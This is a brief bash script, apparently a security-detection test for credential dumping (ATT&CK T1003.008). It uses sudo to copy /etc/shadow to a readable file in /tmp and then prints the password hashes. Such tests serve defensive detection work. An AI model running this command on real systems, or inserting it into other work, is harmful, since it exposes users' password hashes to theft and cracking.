#!/bin/bash
# T1003.008 test 1: Access /etc/shadow (Local)
# elevation_required: True
sudo cat /etc/shadow > /tmp/T1003.008.txt
cat /tmp/T1003.008.txt
